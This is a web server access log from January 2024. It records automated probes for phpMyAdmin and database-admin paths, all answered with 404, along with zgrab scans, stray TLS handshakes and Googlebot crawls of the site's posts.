156.96.155.245 - - [24/Jan/2024:20:15:19 +0000] "GET /phpMyAdmin-2.8.1-rc1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:20 +0000] "GET /phpMyAdmin-2.8.1/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:20 +0000] "GET /phpMyAdmin-2.8.2/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:21 +0000] "GET /sqlmanager/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:21 +0000] "GET /mysqlmanager/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:22 +0000] "GET /p/m/a/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:23 +0000] "GET /PMA2005/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:24 +0000] "GET /pma2005/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:25 +0000] "GET /phpmanager/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:26 +0000] "GET /php-myadmin/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:26 +0000] "GET /phpmy-admin/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:26 +0000] "GET /webadmin/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:27 +0000] "GET /sqlweb/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:28 +0000] "GET /websql/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:28 +0000] "GET /webdb/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:29 +0000] "GET /mysqladmin/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
156.96.155.245 - - [24/Jan/2024:20:15:30 +0000] "GET /mysql-admin/ HTTP/1.1" 404 152 "http://193.122.114.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
45.79.163.53 - - [24/Jan/2024:20:16:48 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.11 - - [24/Jan/2024:20:17:47 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
69.164.217.74 - - [24/Jan/2024:20:20:54 +0000] "GET / HTTP/1.1" 400 280 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.34 - - [24/Jan/2024:20:21:09 +0000] "GET / HTTP/1.1" 200 8108 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
198.235.24.106 - - [24/Jan/2024:20:25:49 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xD0\x92\xBE\xF7%\x07\x00\xEB+H\xD3\xDB\xE5GIfg\x1CH\x0CK\xE3\x9E\x16\x0Cf\x5C\x0BQq\xDD\xA5\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 182 "-" "-"
198.235.24.106 - - [24/Jan/2024:20:25:49 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03g\xD1'\xF7*\x05\xCF\xD8\xED\xBE\xA3\xE4\xC1\xAB\xD8" 400 182 "-" "-"
45.79.181.223 - - [24/Jan/2024:20:33:45 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03q\x137>\xC3\x1B\x04\xBF\xC8\xF7y\xE3\xD9I\xE7I\x90\x9Ck\xD1g]\x10\xB6\x9E\xC6\xE2U\xE8\xC3X\xB4\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 182 "-" "-"
185.100.87.136 - - [24/Jan/2024:20:38:09 +0000] "POST /ajax HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
172.70.134.39 - - [24/Jan/2024:20:43:55 +0000] "GET /robots.txt HTTP/1.1" 200 13 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
172.70.43.112 - - [24/Jan/2024:20:43:56 +0000] "GET /posts/f330a48685b92d65924bbda64018b737/ HTTP/1.1" 200 49938 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.224 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
162.158.78.221 - - [24/Jan/2024:20:43:58 +0000] "GET /robots.txt HTTP/1.1" 200 13 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
172.70.34.137 - - [24/Jan/2024:20:43:59 +0000] "GET /posts/68d74da3d52d3e916033adc77dbd3d13/ HTTP/1.1" 200 27255 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.224 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.19.24.23 - - [24/Jan/2024:20:46:11 +0000] "GET / HTTP/1.1" 200 37591 "-" "-"
66.249.66.205 - - [24/Jan/2024:20:48:29 +0000] "GET /robots.txt HTTP/1.1" 200 13 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
